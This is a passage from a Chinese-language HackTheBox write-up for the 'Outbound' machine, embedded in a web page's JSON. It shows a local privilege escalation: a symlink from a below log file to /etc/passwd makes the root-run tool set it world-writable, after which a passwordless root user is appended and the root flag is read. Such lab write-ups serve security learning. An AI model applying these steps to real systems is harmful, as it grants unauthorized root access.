class=\"hljs-keyword\"\u003efor\u003c/span\u003e jacob on outbound:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser jacob may run the following commands on outbound:\n    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e本以为可以直接通过读文件来拿到 \u003ccode\u003eroot.txt\u003c/code\u003e ，但是\u003ccode\u003esudoers\u003c/code\u003e中禁用了 \u003ccode\u003e--config,--debug,-d\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e应该还是和日志有关\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejacob@outbound:/var/log/below$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 16\ndrwxrwxrwx  3 root  root   4096 Jul 13 07:18 .\ndrwxrwxr-x 13 root  syslog 4096 Jul 13 06:58 ..\n-rw-rw-rw-  1 jacob jacob   382 Jul 13 07:02 error_jacob.log\n-rw-rw-rw-  1 root  root      0 Jul 13 07:18 error_root.log\ndrwxr-xr-x  2 root  root   4096 Jul 13 06:57 store\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们对当前文件夹拥有完全的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'sunset::0:0:sunset:/root:/bin/bash'\u003c/span\u003e \u003e /tmp/fakepasswd\n\u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -f /var/log/below/error_root.log\n\u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -s /etc/passwd /var/log/below/error_root.log\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/below\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后再执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e /tmp/fakepasswd /var/log/below/error_root.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这里发生了什么？\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ebelow\u003c/code\u003e 程序以 \u003ccode\u003eroot\u003c/code\u003e 身份启动。\u003c/li\u003e\n\u003cli\u003e作为一个日志/监控工具，它很可能会在启动时检查或初始化它的日志文件。它的默认日志文件之一就是 \u003ccode\u003e/var/log/below/error_root.log\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ebelow\u003c/code\u003e 程序（以 \u003ccode\u003eroot\u003c/code\u003e 权限）访问 \u003ccode\u003e/var/log/below/error_root.log\u003c/code\u003e。操作系统告诉它，这是一个指向 \u003ccode\u003e/etc/passwd\u003c/code\u003e 的符号链接。\u003c/li\u003e\n\u003cli\u003e程序发现这个文件存在，但为了确保自己能持续写入日志，它可能会执行一个“修复权限”的操作。一个常见的不安全做法就是执行 \u003ccode\u003echmod 666\u003c/code\u003e (或 \u003ccode\u003eugo+w\u003c/code\u003e) 来确保文件是\u003cstrong\u003e全局可写的\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e关键漏洞\u003c/strong\u003e: \u003ccode\u003echmod\u003c/code\u003e 这个系统调用会\u003cstrong\u003e跟随符号链接\u003c/strong\u003e。当 \u003ccode\u003eroot\u003c/code\u003e 权限的 \u003ccode\u003ebelow\u003c/code\u003e 进程对 \u003ccode\u003eerror_root.log\u003c/code\u003e (符号链接) 执行 \u003ccode\u003echmod\u003c/code\u003e 时，它实际上修改的是链接所指向的目标文件——\u003ccode\u003e/etc/passwd\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e结果\u003c/strong\u003e: \u003ccode\u003e/etc/passwd\u003c/code\u003e 文件的权限从 \u003ccode\u003erw-r--r--\u003c/code\u003e (644) 被修改为了 \u003cstrong\u003e\u003ccode\u003erw-rw-rw-\u003c/code\u003e (666)\u003c/strong\u003e。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e切换用户读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esunset@outbound:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e  root.txt\n26811e234c8fb48520e38bf44c164bec\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e到提权之前都是一把梭，提权其实也是，但是对\u003ccode\u003ebelow\u003c/code\u003e不熟悉。\u003c/p\u003e\n\u003cp\u003e提权思路是抄的。\u003c/p\u003e","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","updated":"2025-07-13","tags":["HackTheBox","Linux","RoundcubeMail","Below","encrypt"],"categories":"靶机","comments":true,"description":"Season8 Outbound https://app.hackthebox.com/machines/672 | Linux | Easy Machine Information：As is common in real life pentests, you will start the Out...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Outbound"},"buildId":"rO8NqlxOMnvvJBFiroi4I","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>